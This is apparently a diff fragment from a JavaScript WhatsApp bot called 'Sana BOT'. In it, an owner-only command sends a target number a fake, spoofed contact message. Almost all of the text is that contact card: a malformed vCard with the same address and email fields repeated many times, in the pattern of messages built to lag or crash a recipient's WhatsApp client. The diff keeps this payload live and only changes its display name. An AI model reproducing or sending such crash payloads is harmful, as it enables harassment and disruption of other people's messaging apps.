karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(m.chat, global.premium, fkontaak)
 }
 }
 break
 case 'kontolto': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 